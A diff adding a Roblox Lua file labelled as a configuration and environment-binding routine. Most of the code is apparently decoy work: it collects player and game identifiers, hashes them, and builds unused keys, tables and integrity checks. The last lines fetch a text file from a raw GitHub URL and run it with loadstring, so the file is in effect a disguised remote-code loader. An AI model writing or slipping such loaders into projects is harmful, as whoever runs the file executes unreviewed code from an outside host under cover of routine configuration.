@@ -1,0 +1,103 @@
+--// Config Init v4.2.1 | Environment Bind
+local _s = game:GetService("Players")
+local _r = game:GetService("RunService")
+local _p = _s.LocalPlayer
+
+local _env = {}
+pcall(function()
+    _env.uid = _p.UserId; _env.dn = _p.DisplayName; _env.nm = _p.Name
+    _env.age = _p.AccountAge; _env.pid = game.PlaceId; _env.pv = game.PlaceVersion
+    _env.gid = game.GameId; _env.cid = game.CreatorId; _env.jid = game.JobId
+end)
+_env.tk = tick(); _env.ot = os.time(); _env.oc = os.clock()
+pcall(function() _env.grav = workspace.Gravity end)
+pcall(function() _env.mem = collectgarbage("count") end)
+pcall(function()
+    local cam = workspace.CurrentCamera
+    if cam then _env.fov = cam.FieldOfView; _env.vpx = cam.ViewportSize.X; _env.vpy = cam.ViewportSize.Y end
+end)
+
+local function _mix(h, v)
+    h = bit32.bxor(h, v)
+    h = bit32.bxor(h, bit32.lrotate(h, 13))
+    h = bit32.band(h * 0x45D9F3B, 0xFFFFFFFF)
+    return bit32.bxor(h, bit32.rshift(h, 16))
+end
+
+local function _hash_env()
+    local h = 0x811C9DC5
+    for _, v in pairs(_env) do
+        if type(v) == "number" then h = _mix(h, math.floor(v))
+        elseif type(v) == "string" then
+            for i = 1, #v do
+                h = bit32.bxor(h, string.byte(v, i))
+                h = bit32.band(h * 0x01000193, 0xFFFFFFFF)
+            end
+        end
+    end
+    return h
+end
+
+local _ep = {}; local _xs = {0xABCD1234, 0x5678EF90, 0x13579BDF, 0x2468ACE0}
+local function _xsh()
+    local t = _xs[4]; local s = _xs[1]
+    _xs[4] = _xs[3]; _xs[3] = _xs[2]; _xs[2] = s
+    t = bit32.bxor(t, bit32.lshift(t, 11))
+    t = bit32.bxor(t, bit32.rshift(t, 8))
+    _xs[1] = bit32.bxor(t, bit32.bxor(s, bit32.rshift(s, 19)))
+    return _xs[1]
+end
+
+for i = 1, 256 do _ep[i] = _xsh() % 256 end
+
+local _mp = {}
+for i = 1, 32 do
+    _mp[i] = {base = _xsh(), sz = 4096, fl = bit32.bor(0x04, bit32.lshift(i%3,4)), cs = 0}
+    local cs = 0
+    for _ = 1, 8 do cs = bit32.bxor(cs, _xsh()) end
+    _mp[i].cs = cs
+end
+
+local function _stk()
+    local d = 0; local f = {}
+    for lv = 1, 48 do
+        local info = debug.info(lv, "sln")
+        if not info then break end
+        d = lv; f[lv] = {s = tostring(info), d = lv, h = _xsh()}
+    end
+    return {depth = d, frames = f, valid = d < 48}
+end
+
+local _ireg = {}
+local function _regfn(n, fn)
+    _ireg[n] = {ref = fn, addr = tostring(fn), at = tick(), cc = 0}
+end
+local function _verifyi()
+    for _, e in pairs(_ireg) do
+        if tostring(e.ref) ~= e.addr then return false end
+    end
+    return true
+end
+
+-- bind
+local _eh = _hash_env()
+_stk()
+_regfn("hash", _hash_env)
+_regfn("stack", _stk)
+_regfn("verify", _verifyi)
+
+local _derived = {}
+local st = _eh
+for i = 1, 4 do
+    st = bit32.bxor(st, bit32.lrotate(st, i*7))
+    st = bit32.band(st * 0x45D9F3B, 0xFFFFFFFF)
+    _derived[i] = string.format("%08X", st)
+end
+local _session_key = table.concat(_derived, "-")
+
+if _verifyi() then
+    local _bind_hash = bit32.bxor(_eh, os.time())
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/sakatoshi-og/Universal-Script/main/utils/core.txt"))()
+    end)
+end
